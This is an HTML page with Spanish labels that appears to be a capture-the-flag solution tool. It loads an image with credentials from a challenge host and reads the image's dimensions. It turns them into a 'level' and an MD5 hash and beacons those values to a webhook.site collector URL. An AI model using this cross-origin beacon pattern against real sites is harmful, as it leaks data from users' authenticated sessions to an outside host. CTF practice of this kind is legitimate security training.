<!doctype html>
<html lang="es">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CTF Viewer</title></head>
<body>
  <h3>CTF: obtener nivel</h3>
  <label>Target (protocol+host): <input id="domain" value="https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar" /></label>
  <label>Path (ej: /profile-pic): <input id="path" value="/profile-pic" /></label>
  <label>Collector (ej: https://webhook.site/ID): <input id="collector" value="https://webhook.site/YOUR-ID" /></label>
  <button id="go">Cargar</button>
  <div id="out"></div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js"></script>
  <script>
    document.getElementById('go').onclick = function() {
      const domain = document.getElementById('domain').value.replace(/\/+$/,'');
      const path = document.getElementById('path').value;
      const collector = document.getElementById('collector').value;
      const target = domain + (path.startsWith('/') ? path : '/' + path) + '?_cb=' + Date.now();

      const img = new Image();
      img.src = target;
      img.crossOrigin = "use-credentials"; // NO asegura lectura si servidor no permite CORS
      img.onload = function() {
        const w = img.naturalWidth, h = img.naturalHeight;
        const level = w * h;
        const md5level = md5(String(level));
        document.getElementById('out').innerText = `w=${w} h=${h} level=${level} md5=${md5level}`;
        if (collector) {
          // beacon por GET (imagen) para evitar bloqueos CORS en el collector
          const u = new URL(collector);
          u.searchParams.set('t', new Date().toISOString());
          u.searchParams.set('target', target);
          u.searchParams.set('w', w);
          u.searchParams.set('h', h);
          u.searchParams.set('level', level);
          u.searchParams.set('md5', md5level);
          new Image().src = u.toString();
        }
      };
      img.onerror = function(e){ document.getElementById('out').innerText = 'Error cargando imagen (403/404/CSP?)'; };
      document.body.appendChild(img); // opcional: mostrar imagen
    };
  </script>
</body>
</html>
